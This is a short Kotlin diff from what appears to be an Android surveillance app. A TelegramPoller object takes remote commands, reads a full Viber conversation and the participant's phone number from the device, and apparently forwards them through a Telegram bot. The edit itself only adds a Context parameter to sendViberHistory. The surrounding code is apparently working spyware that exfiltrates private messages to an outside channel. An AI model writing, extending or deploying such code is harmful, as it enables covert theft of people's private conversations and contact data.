@@ -135,7 +135,7 @@ object TelegramPoller {
                 val conversationId = arg.toLongOrNull() ?: return
                 ViberReader.readAllMessages(ctx, conversationId)?.let { msgs ->
                     val phone = ViberReader.participantNumber(ctx, 2L) ?: "?"
-                    sendViberHistory(msgs, phone)
+                    sendViberHistory(ctx, msgs, phone)
                 } ?: run {
                     TelegramClient.sendText("❌ Не удалось прочитать историю диалога")
                 }
@@ -150,7 +150,7 @@ object TelegramPoller {
         }
     }
 
-    private fun sendViberHistory(msgs: List<ViberReader.Msg>, phone: String) {
+    private fun sendViberHistory(ctx: Context, msgs: List<ViberReader.Msg>, phone: String) {
         val DATE_FMT = "yyyy-MM-dd HH:mm:ss"
         val sdf = java.text.SimpleDateFormat(DATE_FMT, java.util.Locale.ROOT).apply {
             timeZone = java.util.TimeZone.getTimeZone("UTC")
